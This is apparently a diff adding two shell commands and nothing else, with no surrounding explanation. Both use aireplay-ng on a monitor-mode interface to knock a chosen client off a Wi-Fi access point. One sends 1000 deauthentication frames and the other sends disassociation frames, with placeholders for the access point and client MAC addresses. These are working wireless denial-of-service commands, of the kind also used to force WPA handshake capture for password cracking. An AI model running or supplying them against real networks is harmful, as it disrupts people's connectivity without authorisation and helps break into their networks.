@@ -1,0 +1,2 @@
+sudo aireplay-ng --deauth 1000 -a <BSSID> -c <MAC ID> wlan1mon
+sudo aireplay-ng --disassoc 10 -a <BSSID> -c <MAC ID> wlan1mon
